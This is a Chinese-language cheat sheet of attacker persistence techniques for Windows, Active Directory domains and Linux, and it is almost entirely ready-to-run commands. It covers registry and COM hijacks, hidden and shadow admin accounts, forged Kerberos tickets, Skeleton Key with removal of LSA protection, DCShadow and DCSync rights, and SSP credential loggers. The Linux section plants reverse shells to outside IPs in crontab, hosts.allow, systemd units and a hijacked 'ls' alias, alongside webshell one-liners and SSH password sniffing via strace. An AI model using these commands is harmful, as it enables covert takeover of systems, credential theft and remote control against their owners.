# Persistence

权限的维持，健壮离不开这三种思想：

1.系统共生

2.利用信任

3.少即是多

工具的使用遵循小而巧，单一工具解决单一问题。可以更好的保持过程的健壮性。

<br>

###### windows 19种

粘滞键后门(映像劫持)，注册表和系统启动项，计划任务，服务 ，隐藏账户，影子账户

<br>

userinit(用户登录初始化)，logon script(优先av执行)，屏幕保护程序，waitfor，CLR( .NET程序劫持 )，Hijack CAccPropServicesClass and MMDeviceEnumerator( COM劫持 )，劫持MruPidlList，office(Word WLL,Excel XLL,PowerPoint VBA add-ins)，文件关联，AppInit_DLLs，Netsh helper，BITS，inf

###### windows域 12种

fake Ticket(Golden Ticket，Silver Ticket，Diamond Ticket，Sapphire Ticket)

SID_history，DSRM，Skeleton Key，shadow credential，adminSDHolder，DCshadow，伪造域控

委派，ACL滥用

SSP，Hook PasswordChangeNotify

###### linux 12种

启动项，sudo/suid，crontab自动任务，SSH公钥免密，SSH软连接，后门用户，超级账户，alias后门，strace后门，SSH Wrapper后门，TCP Wrapper后门，system服务后门

<br>

###### other 2种

cymothoa后门(被meterpreter代替)(进程注入)

WMI后门

<br>

[TOC]

#### 粘滞键后门(绕过TrustedInstaller权限,映像劫持:注册表实现)

```
reg add "hklm\software\microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "debugger" /t "REG_SZ" /d "c:\windows\system32\cmd.exe"  #这里的sethc.exe可以替换为其他程序
```

#### 注册表后门和系统启动项后门

###### 注册表后门(写入一组键值)

```
reg add hklm\... /v "begin" /t REG_SZ /d "c:\windows\...\...exe"



HKCU\Software\Microsoft\Windows\CurrentVersion\Run

HKCU\Software\Microsoft\Windows\CurrentVersion\Runonce

HKLM\Software\Microsoft\Windows\CurrentVersion\Run

HKLM\Software\Microsoft\Windows\CurrentVersion\Runonce

HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run

HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Runonce
```

###### 系统启动项(将应用程序放入文件夹中)

```
%appdata%\Microsoft\Windows\Start Menu\Programs\Startup

%programdata%\Microsoft\Windows\Start Menu\Programs\StartUp
```

#### 计划任务后门

```
schtasks /create /tn "start_hm" /tr "C:\x.bat" /sc onstart /ru system /f #开机启动

schtasks /create /tn "start_login" /tr "c:\shell.exe" /sc onlogon /ru win2016 /f #登录时启动

schtasks /create /tn "run_hm" /tr "C:\Windows\System32\notepad.exe" /sc MINUTE /mo 1 /ru SYSTEM /f #创建成功后每分钟执行一次notepad.exe命令
```

#### 服务后门

```
sc create backdoor binpath= "c:\windows\system32\cmd.exe /c start c:\shell.exe" start= auto #通过原生进程启动后门，防止中断
```

#### 隐藏账户

```
net user back$ 1qaz@WSX /add

net localgroup administrators back$ /add
```

#### 影子账户

```
net user backdoor$ 1qaz@WSX /add

net localgroup administrators backdoor$ /add



reg query "hklm\sam\sam\domains\account\users"

reg query "hklm\sam\sam\domains\account\users\names\backdoor$" /z #1005

printf "%x" 1005 #3ed



reg query "hklm\sam\sam\domains\account\users\000001F4" #获得f值



reg add "hklm\sam\sam\domains\account\users\000003ED" /v F /t reg_binary /d 020001000000000015E28244FE6ACD0100000000000000006879C621AE76DC0100000000000000000000000000000000F401000001020000100000000000000000000100010000000000000000000000 /f



reg export "hklm\sam\sam\domains\account\users\names\backdoor$" c:\main\backdoor$.reg

reg export "hklm\sam\sam\domains\account\users\000003ED" c:\main\000003ED.reg

net user backdoor$ /del

reg import c:\main\backdoor$.reg

reg import c:\main\000003ED.reg

```

#### Userinit(用户登录初始化)

reg add "hklm\software\microsoft\windows nt\currentversion\winlogon" /v "Userinit" /t reg_sz /d "C:\Windows\system32\userinit.exe,c:\windows\system32\cmd.exe"

logon script(优先av执行)

reg add "hkcu\Environment" /v "UserInitMprLogonScript" /t reg_sz /d "c:\windows\system32\cmd.exe"

屏幕保护程序

HKCU\Control Panel\Desktop

SCRNSAVE.EXE - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序

ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态

ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）

waitfor

waitfor test && calc 表示接收信号成功后执行计算器

waitfor /s 192.168.163.143 /u qiyou /p qiyou /si test

https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1

CLR( .NET程序劫持 )

修改一下注册表，注册表路径：HKEY_CURRENT_USER\Software\Classes\CLSID\，新建子项{11111111-1111-1111-1111-111111111111}（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项InProcServer32，新建一个键ThreadingModel，键值为：Apartment，默认的键值为我们dll的路径

然后在cmd下设置一下：

PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序

SETX COR_ENABLE_PROFILING=1 /M

SETX COR_PROFILER={11111111-1111-1111-1111-111111111111} /M

Hijack CAccPropServicesClass and MMDeviceEnumerator( COM劫持 )

在%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\下放入我们的后门dll，重命名为test._dl

然后就是修改注册表了，在注册表位置为：HKCU\Software\Classes\CLSID\下创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}，然后再创建一个子项InprocServer32，默认为我们的dll文件路径：C:\Users\qiyou\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}，再创建一个键ThreadingModel，其键值为：Apartment

PS：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass，{BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator

劫持MruPidlList

在注册表位置为HKCU\Software\Classes\CLSID\下创建项{42aedc87-2188-41fd-b9a3-0c966feabec1}，再创建一个子项InprocServer32，默认的键值为我们的dll路径，再创建一个键ThreadingModel，其键值：Apartment

该注册表对应COM对象MruPidlList，作用于shell32.dll，而shell32.dll是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中explorer.exe会调用shell32.dll，然后会加载COM对象MruPidlList，从而触发我们的dll文件

当用户重启时或者重新创建一个explorer.exe进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。

office(Word WLL,Excel XLL,PowerPoint VBA add-ins)

Word WLL

把dll文件保存在%APPDATA%\Microsoft\Word\Startup，然后把后缀名改为wll

PS：Startup支持启动多个wll

打开word，成功弹框

Excel XLL

Excel dll的编写可以参考三好师傅这个项目：

https://github.com/3gstudent/Add-Dll-Exports

用三好师傅powershell脚本生成现成的Excel dll：

https://github.com/3gstudent/Office-Persistence

将生成的DLL文件复制到%appdata%\Microsoft\AddIns目录下，然后再修改一下注册表，office版本对应的注册表位置如下：

office2003 — HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\

office2007 — HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\

office2010 — HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\

office2013 — HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\

office2016 — HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\我这里使用的2010的，所以我们要修改的是HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options，添加一个键OPEN，键值为：/R test.dll

PowerPoint VBA add-ins

用三好师傅powershell脚本生成现成的PowerPoint dll：

https://github.com/3gstudent/Office-Persistence

将生成的DLL文件复制到%appdata%\Microsoft\AddIns目录下，然后参考前面我给出的office版本对应的注册表位置，在HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint下新建一个子项：AddIns，然后在AddIns下面新建一个子项test，新建一个键为Autoload，类型为DWORD，键值为：1；新建一个键为Path，类型为SZ，键值为我们dll文件的路径

文件关联

AppInit_DLLs

User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，如果有值，调用LoadLibrary() api加载用户dll。

其注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs，把AppInit_DLLs的键值设置为我们dll路径，将LoadAppInit_DLLs设置为1

Netsh helper

关于helper dll的编写可以参考这个项目：https://github.com/outflanknl/NetshHelperBeacon

1.

netsh add helper yourdll.dll

2.

其位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh，创建一个键，名称随便，键值为我们dll的路径

BITS

bitsadmin /create test

bitsadmin /addfile test c:\windows\system32\calc.exe c:\Users\qiyou\Desktop\calc.exe //为了方便起见我们直接复制本地文件

bitsadmin /SetNotifyCmdLine test cmd.exe "cmd.exe /c calc.exe"

bitsadmin /resume test

inf

后门实现：

在注册表HKEY_CURRENT_USER\Software\Microsoft\处依次新建子项\IEAK\GroupPolicy\PendingGPOs，然后再新建几个键，如下：

键：Count，类型：REG_DWORD，键值：1

键：Path1，类型：REG_SZ，键值：C:\Users\Administrator\Desktop\test\calc.inf //这个为我们inf文件的路径，这里以上面那个inf文件例子为例

键：Section1，类型：REG_SZ，键值：DefaultInstall

[Version]

Signature="$CHICAGO$"

AdvancedINF=2.5,"test"

[DefaultInstall]

RunPreSetupCommands=Command1

[Command1]

C:\windows\system32\calc.exe

1.rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall

2.重启电脑之后成功弹出计算器

#### fake Ticket

###### golden ticket

```
impacket-ticketer administrator -dc-ip 192.168.10.5 -nthash 036753a940934248720ffda026797b59 -domain one.com -domain-sid S-1-5-21-365535506-3472225606-1523363171 #krbtgt_nthash
```

###### Silver Ticket

```
impacket-ticketer administrator -spn cifs/DC.one.com -dc-ip 192.168.10.5 -nthash a3b9a052ee7bc4a91b19b2ed041de15d -domain one.com -domain-sid S-1-5-21-365535506-3472225606-1523363171 #DC$_nthash
```

###### Diamond Ticket(实验)

```
impacket-ticketer administrator -request -user administrator -password 1qaz@WSX -nthash 161cff084477fe596a5db81874498a24 -dc-ip 192.168.10.5 -aesKey 4dd28b9244b1410cabc21f8707f41e88b7303ab000749b03df6dd5ed41138151 -domain one.com -domain-sid S-1-5-21-365535506-3472225606-1523363171 #administrator_nthash,krbtgt_aesKey
```

###### Sapphire Ticket(实验)

```
impacket-ticketer administrator -impersonate administrator -request -user administrator -password 1qaz@WSX -nthash 161cff084477fe596a5db81874498a24 -dc-ip 192.168.10.5 -aesKey 4dd28b9244b1410cabc21f8707f41e88b7303ab000749b03df6dd5ed41138151 -domain one.com -domain-sid S-1-5-21-365535506-3472225606-1523363171 #administrator_nthash,krbtgt_aesKey
```

#### SID_history后门

```
net user back$ 1qaz@WSX /add

privilege::debug

sid::patch

sid::add /sam:back$ /new:administrator #将Administrator的sid赋值给goodman的sid_history
```

#### DSRM后门

```
privilege::debug

lsadump::lsa /patch /name:krbtgt #查看krbtgt_hash

token::elevate #提升令牌权限

lsadump::sam  #查看dsrm_nthash



ntdsutil

set dsrm password

sync from domain account krbtgt #修改DSRM密码为krbtgt密码

q

q



reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f #开启dsrm可登录

lsadump::lsa /patch /name:krbtgt #查看krbtgt_hash

1 . impacket-psexec DC/administrator@192.168.10.5 -hashes :43cb1c8744ef1224eff6b3b403c60b62 #域控的名字，krbtgt的hash

2 . sekurlsa::pth /domain:DC /user:Administrator /ntlm:43cb1c8744ef1224eff6b3b403c60b62 #域控的名字，krbtgt的hash(会弹窗)
```

#### Skeleton Key

```
1 .

privilege::debug

misc::skeleton



2 .

lsa保护策略绕过

reg delete "hklm\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL #关闭 LSA 保护策略

\#reg add "hklm\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f #开启 LSA 保护策略

privilege::debug

misc::skeleton



3 .

lsa保护策略绕过(需要mimidrv.sys放在同目录)

privilege::debug

!+

!processprotect /process:lsass.exe /remove

misc::skeleton



net use \\DC\ipc$ "mimikatz" /user:one\administrator #建立管道 条件：域成员机器，域用户(普通权限即可)

psexec.exe \\DC cmd.exe #microsoft pstools.psexec工具
```

#### Shadow Credential*

```
域控制器版本在Windows Server 2016以上

域控制器上安装Active Directory证书服务(AD CS)

需要对目标用户msDS-KeyCredientialLink属性可写



certipy-ad shadow auto -account win2016 -u Administrator@one.com -p '1qaz@WSX' -dc-ip 192.168.10.5 -target DC.one.com
```

#### adminSDHolder

```
github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

powershell -ep bypass ". .\PowerView.ps1 ; Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=two,DC=com" -PrincipalIdentity win2019 -Rights All -Verbose" #给win2019用户添加对adminSDHolder的权限



github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1

powershell -ep bypass ". .\PowerView.ps1 ; Invoke-ADSDPropagation -TaskName runProtectAdminGroupsTask" #强制SDProp进程立刻执行



net group "Domain Admins" win2019 /add /domain #验证

```

#### DCshadow(要在另一台域主机上使用)

```
system: #PsExec64.exe -i -s cmd.exe #需要system权限

net user hack 1qaz@WSX /add /domain

token::whoami #system

lsadump::dcshadow /object:CN=hack,CN=Users,DC=two,DC=com /attribute:primarygroupid /value:512



two\administrator: #PsExec64.exe -u two\administrator cmd #需要two\administrator权限

token::whoami #two\administrator

lsadump::dcshadow /push
```

#### 伪造域控

```
impacket-addcomputer -computer-name 'machine' -computer-pass 'root' -dc-ip 192.168.12.5 'two.com/win2019:root' -method SAMR -debug #添加机器用户machine$，密码root



$ADComputer = Get-ADComputer -Identity machine ; Set-ADObject -Identity $ADComputer -Replace @{userAccountControl=8192} #将userAccountControl更改为8192(powershell)



net group "domain controllers" /domain

impacket-secretsdump two/machine$:root@192.168.12.5
```

#### 委派

```
基于资源的约束性委派

net user john 1qaz@WSX /add /domain

setspn -A xxx/DC.two.com:5555 john

Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount john

Get-ADUser krbtgt -Properties "PrincipalsAllowedToDelegateToAccount"



impacket-getST -dc-ip 192.168.12.5 -spn krbtgt -impersonate administrator two.com/john:1qaz@WSX

export KRB5CCNAME=administrator@krbtgt_TWO.COM@TWO.COM.ccache

impacket-smbexec -dc-ip 192.168.12.5 DC.two.com -no-pass -k
```

#### ACL滥用

```
Rights : fullcontrol(GenericAll)(用有对某个账户的所有权限)

Rights : resetpassword(User-Force-Change-Password)(拥有某个账户的重置密码权限)

Rights : writemembers(member)(拥有某个组的添加/移除用户权限)

Rights : dcsync(DCSync)(拥有对某个域控的hash导出权限)



Add-DomainObjectAcl -TargetIdentity 'DC=two,DC=com' -PrincipalIdentity john -Rights DCSync #添加john对DC域的dcsync权限
```

#### SSP后门

###### 内存持久化法(半持久,关机失效)  #win2012-R2-可用，winserver2016+失效

```
privilege::debug

misc::memssp

type C:\Windows\System32\mimilsa.log
```

###### dll持久化法

```
copy mimilib.dll c:\windows\system32\mimilib.dll

reg query "hklm\system\currentcontrolset\control\lsa" /v "security packages" #查看原数据

reg add "hklm\system\currentcontrolset\lsa" /v "security packages" /t reg_multi_sz /d "kerberosmsv1_0\0...\0mimilib" /f #数据使用\0隔开

type c:\windows\system32\kiwissp.log
```

#### Hook PasswordChangeNotify #2012-R2-可用，2016+失效

```
github.com/Al1ex/Hook-PasswordChangeNotify



github.com/clymb3r/Misc-Windows-Hacking

raw.githubusercontent.com/clymb3r/PowerShell/refs/heads/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1



powershell -ep bypass ". .\Invoke-ReflectivePEInjection.ps1 ; Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass" #注入lsass进程



type c:\windows\temp\passwords.txt
```

## linux权限维持

后门是一种技术上的浪漫，隐秘的智慧、创造与破坏的张力，淋漓尽致。

#### 后门

```
bash : /bin/bash -c "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/80 0>&1"

php : 

asp : <%execute(request("cmd"))%>

aspx : <%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>

jsp : <% Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));%> (无回显)
```

#### 启动项

```
/etc/profile #登录系统shell时执行或者登录ssh的时候执行

/etc/bashrc / /etc/bash.bashrc #当登录时或者每次打开新的shell都会执行 / 当退出登录shell时都执行

.bash_profile / .profile #登录shell的时候执行一次

.bashrc / .bash_logout  #当登录时或者每次打开新的shell都会执行 / 当退出登录shell时都执行

执行顺序

/etc/profile → /etc/profile.d/*.sh → ~/.bash_profile（或 ~/.profile）→ ~/.bashrc
```

#### sudo/suid

```
echo "Qsa3 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers #添加用户sudo权限

chmod u+s /usr/bin/bash #给/usr/bin/bash增加suid权限
```

#### crontab自动任务

```
/etc/crontab[cron.d/cron.daily/cron.hourly/cron.monthly/cron.weekly]

echo '* * * * * root bash -c "bash -i &> /dev/tcp/192.168.10.132/443 0>&1"' >> /etc/crontab

var目录下属于特定用户的自动任务不能写执行者，即上文的root

创建文件时只能用 crontab - 方式，后续可写入文件（有些发行版可以>创建文件）

/var/spool/cron/crontabs / /var/spool/cron/

echo '* * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.10.129/1234 0>&1"' | crontab -

crontab -r #删除当前用户的所有定时任务

crontab -l #查看当前用户的所有定时任务
```

#### SSH公钥免密

```
ssh-keygen -t rsa 按三次回车在~/.ssh文件夹生成id_rsa.pub id_rea

\#ssh-keygen -t rsa -f ~/.ssh/id_rsa -N "" 无回显，不交互

cp id_rsa.pub ~/.ssh/authorized_keys

ssh -i id_rsa xxxx@xxx.xxx.xxx.xxx #使用私钥登录
```

#### SSH软连接

```
ln -sf /usr/sbin/sshd /tmp/su ; /tmp/su -oPort=10022 #创造软链接开放ssh服务在10022端口
```

#### 后门用户

```
useradd -m qwe

echo "qwe:1qaz@WSX" | sudo chpasswd #无声设置用户密码

sudo usermod -aG sudo qwe #将用户加入sudo组（便于ssh登录）

\#sudo gpasswd -d qwe sudo #将用户移除sudo组（便于隐藏痕迹）
```

#### 超级账户

```
useradd -o -u 0 root_sham

echo "root_sham:1qaz@WSX" | chpasswd
```

#### alias后门

```
alias ls='alerts(){ls $* --color=auto;bash -c "bash -i >&/dev/tcp/127.0.0.1/1234 0>&1 &"};alerts 2>/dev/null'       $* 将所有参数返回给原命令 最后一个&作用是将任务放在后台执行， 2>/dev/null然后将错误不显示出来

unalias ls
```

#### Strace后门

```
strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/.sshd.log &   #监控键盘记录ssh登录记录

cat /tmp/.sshd.log | grep -oP '"\\(10|f)\\0\\0\\0\K[^"]+(?=")'
```

#### SSH Wrapper后门(包装器后门,冒充服务后门，是一种思想，偷天换日思想) (实验：可能会导致服务无法正常启动）

```
mv /usr/sbin/sshd /usr/sbin/sshd_real #这里使用sshd举例

touch /usr/sbin/sshd

touch -r /usr/sbin/sshd_real /usr/sbin/sshd

echo 'exec /usr/sbin/sshd_real "$@"' >> /usr/sbin/sshd  #新脚本运行完，指向真正的sshd脚本，服务器重启之后会执行
```

#### TCP Wrapper后门

```
/etc/hosts.allow #允许所有的连接，并且当连接出现时，启动bash进行反弹连接。

echo 'ALL: ALL: spawn (bash -c "/bin/bash -i >& /dev/tcp/192.168.10.129/8888 0>&1") & :allow' >> /etc/hosts.allow

ssh xxx@xxx.xxx.xxx.xxx #这里的xxx.xxx.xxx.xxx为靶机ip
```

#### systemd服务后门

```
/etc/systemd/system/backdoor.service

\-----------------------------------------------------------

[Unit]

Description=Very important backdoor.

After=network.target

[Service]

Type=forking

ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxx 0>&1"

ExecReload=

ExecStop=

PrivateTmp=true

[Install]

WantedBy=multi-user.target

\-----------------------------------------------------------

chmod +x /etc/systemd/system/backdoor.service

systemctl daemon-reload

systemctl enable backdoor

systemctl start backdoor
```

#### wmi

```
Import-Module .\Persistence\Persistence.psm1

$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'

$UserOptions = New-UserPersistenceOption -Registry -AtLogon

Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
```